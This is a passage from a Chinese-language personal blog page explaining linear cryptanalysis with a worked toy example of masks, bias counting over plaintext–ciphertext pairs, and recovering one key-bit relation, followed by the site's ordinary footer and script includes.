<p>注意，并不能确定的获取密钥在该位的取值，只是获取掩码对应的几位之间的信息。</p>
</li>
</ol>
<p>例子：</p>
<blockquote>
<ol>
<li><p>固定掩码 $\alpha=(1,0,0,1) \text { and } \beta=(0,0,1,0)\$ ;</p>
</li>
<li><p>假设关系式 $(\alpha \cdot m) \oplus(\beta \cdot c)=\left(\alpha \cdot k_{0}\right) \oplus\left(\beta \cdot k_{1}\right)$ 成立的概率位 $2/16$，则不成立概率 $14/16$ ；</p>
</li>
<li><p>假设，密钥关系 $(\alpha \cdot k_{0}) \oplus(\beta \cdot k_{1})=1$ 对 N 个明密文对计算  $(\alpha \cdot m) \oplus (\beta \cdot c)$ ，将预计得到 $2N/16$ 个 1 和  $14N/16$ 个 0，即 $T_0 = \frac{2N}{16}\ and\ T_1 = \frac{14N}{16}$ </p>
</li>
<li><p>如果 3. 的计数器满足上面所述，则可以猜测  $(\alpha \cdot k_{0}) \oplus(\beta \cdot k_{1})=1$ 是正确的，否则，其是错误的，也就是  $(\alpha \cdot k_{0}) \oplus(\beta \cdot k_{1})=0$ （这种情况 $T_0$ 和 $T_1$ 的计数应该差不多和 3. 相反）；</p>
</li>
<li>如果 3. 的计数器满足上述，就可获得密钥信息  $(\alpha \cdot k_{0}) \oplus(\beta \cdot k_{1})=1\ \ i.e.\ \ k_{0,0}\oplus k_{0,3} \oplus k_{1,2} = 1$ ；</li>
<li>继续寻找更多关系来尽可能多的恢复密钥比特。</li>
</ol>
</blockquote>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">icSnow</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <script size="300" alpha="0.6" zIndex="-1" src="https://cdn.jsdelivr.net/npm/ribbon.js@1.0.2/dist/ribbon.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/@next-theme/pjax@0.5.0/pjax.min.js" integrity="sha256-3NkoLDrmHLTYj7csHIZSr0MHAFTXth7Ua/DDt4MRUAg=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/pjax.js"></script>

  
<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>





  




  

  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js","integrity":"sha256-r+3itOMtGGjap0x+10hu6jW/gZCzxHsoKrOd7gyRSGY="}}</script>
<script src="/js/third-party/math/mathjax.js"></script>



<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":100,"height":200},"mobile":{"show":true},"log":false});</script></body>
</html>
